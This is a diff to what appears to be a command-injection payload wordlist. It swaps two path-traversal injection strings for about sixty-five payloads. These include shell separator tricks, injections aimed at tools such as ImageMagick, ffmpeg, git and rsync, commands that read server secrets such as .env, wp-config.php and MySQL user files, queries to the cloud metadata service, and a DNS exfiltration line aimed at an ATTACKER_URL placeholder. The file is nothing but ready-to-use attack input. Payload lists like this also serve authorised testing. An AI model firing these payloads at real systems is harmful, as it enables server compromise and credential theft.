@@ -1,2 +1,66 @@
-/var/www/html/images/../../../../../tmp/test;id
-../../tmp/test;id
+; id
+| id
+`id`
+$(id)
+; id #ping context
+; id #nslookup context
+; id #convert context
+; id #ffmpeg context
+; id #imagemagick context
+; id #zip/unzip context
+; id #tar context
+; id #wget/curl context
+; id #git context
+; id #svn context
+; id #rsync context
+; id #scp context
+; id #ssh context
+; id #mysql context
+; id #mongodump context
+; id #pg_dump context
+127.0.0.1; id
+127.0.0.1 | id
+127.0.0.1`id`
+127.0.0.1$(id)
+127.0.0.1 && id
+127.0.0.1 || id
+http://127.0.0.1/; id
+http://127.0.0.1/| id
+http://127.0.0.1/`id`
+http://127.0.0.1/$(id)
+localhost; id
+localhost | id
+localhost`id`
+test.com; id
+test.com | id
+test.com`id`
+test.com$(id)
+example.com; id
+$(nslookup `id`.ATTACKER_URL)
+$(curl -s http://169.254.169.254/latest/meta-data/public-hostname)
+$(wget -q -O- http://169.254.169.254/latest/meta-data/)
+; ls /var/www/html
+; cat /var/www/html/config.php
+; cat /var/www/html/.env
+; cat /var/www/html/wp-config.php
+; cat /var/www/html/database.yml
+; cat /etc/apache2/apache2.conf
+; cat /etc/nginx/nginx.conf
+; cat /etc/mysql/my.cnf
+; cat /etc/postgresql/*/main/pg_hba.conf
+; cat /var/lib/mysql/mysql/user.MYD
+convert ';id' out.jpg
+convert 'xc:red' ';id'
+convert -size 50x50 xc:red ';id'
+ffmpeg -i ';id' out.mp4
+zip ';id.zip' *.txt
+tar -cf ';id.tar' *.txt
+ping -c 1 ';id'
+nslookup ';id'
+git clone ';id'
+git -c core.pager='id;cat' log
+git init . && git -c core.sshCommand='id' fetch
+svn export ';id' .
+rsync -a ';id':: .
+ssh ';id'@localhost
+scp file ';id':/tmp/
